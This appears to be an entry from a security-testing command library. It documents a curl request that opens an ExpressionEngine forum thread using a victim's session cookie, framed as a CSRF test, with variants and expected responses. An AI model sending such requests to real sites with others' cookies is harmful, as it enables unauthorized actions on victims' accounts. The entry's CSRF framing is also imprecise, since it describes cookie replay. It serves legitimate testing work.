---
data: >-
  curl -X GET "http://target.com/forum/thread_open/123" -H "Cookie:
  exp_sessionid=valid_session; other_cookies"
tags:
  - csrf
  - web
  - test
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 094c7ddf-3a5f-43a4-a22d-31f69a2e2e6b
created_at: '2025-12-14T17:27:42.911Z'
updated_at: '2025-12-14T17:27:42.911Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-test-open

## Command

```bash
curl -X GET "http://target.com/forum/thread_open/123" -H "Cookie: exp_sessionid=valid_session; other_cookies"
```

## Description

This command tests a CSRF vulnerability by sending a forged GET request to open a forum thread in ExpressionEngine, simulating an authenticated user's action without CSRF tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `"http://target.com/forum/thread_open/123"` | Target endpoint with thread ID (replace 123) | Yes |
| `-H "Cookie: ..."` | Victim's session cookies to mimic authentication | Yes for testing |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/forum/thread_open/123" -H "Cookie: exp_sessionid=abc123"
```

### Advanced Usage

```bash
curl -X GET "http://target.com/forum/thread_open/123" -H "Cookie: exp_sessionid=abc123" -v
```

Add -v for verbose output to inspect headers and response.

## Expected Output

HTTP/1.1 200 OK or 302 redirect, with body indicating successful thread update (e.g., no error about missing token). Failure would show 403 Forbidden if protected.

## Related

- [[Related Procedure: Exploit-CSRF-to-Manipulate-Forum-Threads]]
